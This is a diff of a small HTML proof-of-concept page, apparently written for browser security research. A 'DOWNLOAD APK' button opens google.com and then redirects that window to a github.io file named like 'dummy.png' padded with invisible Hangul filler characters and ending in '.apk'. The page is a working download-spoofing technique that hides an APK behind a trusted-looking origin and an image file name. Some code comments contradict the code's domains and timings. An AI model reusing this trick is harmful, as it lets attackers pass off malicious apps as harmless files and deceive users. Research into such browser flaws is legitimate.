@@ -1,40 +1,48 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="utf-8">
-<title>Download Origin Confusion PoC</title>
-<style>
-button {
-    padding: 14px 28px;
-    font-size: 16px;
-    background: #4CAF50;
-    color: #fff;
-    border: none;
-    cursor: pointer;
-}
-</style>
+    <meta charset="utf-8">
+    <title>Redirect Bertahap PoC</title>
+    <style>
+        .button {
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+        }
+    </style>
 </head>
 <body>
 
 <script>
-function startPoC() {
-    const t0 = Date.now();
+function a() {
+    const start = Date.now();
+    console.log("Window opened at", start);
 
-    // User opens a trusted domain first
-    const w = window.open(
-        'https://ecdnts-del.github.io/test-apk/dummy.png%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4.apk',
-        '_blank'
-    );
+    // Step 1: buka apple.com
+    let win = window.open('https://google.com', 'x');
 
-    // Optional: log timing for analysis
-    setTimeout(() => {
-        console.log('Elapsed:', Date.now() - t0, 'ms');
-    }, 1000);
+    // Step 2: redirect sangat cepat (±100 ms)
+    setTimeout(function () {
+        console.log("Redirect 1 after", Date.now() - start, "ms");
+        win.location.href =
+            'https://ecdnts-del.github.io/test-apk/dummy.png%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4.apk';
+
+        // Step 3: redirect berikutnya (opsional, 900 ms)
+        setTimeout(function () {
+            console.log("Redirect 2 after", Date.now() - start, "ms");
+            win.location.href = 'https://google.com';
+        }, 3000);
+
+    }, 2000);
 }
 </script>
 
 <center>
-<button onclick="startPoC()">Download File</button>
+    <input type="button" class="button" value="DOWNLOAD APK" onclick="a()">
 </center>
 
 </body>
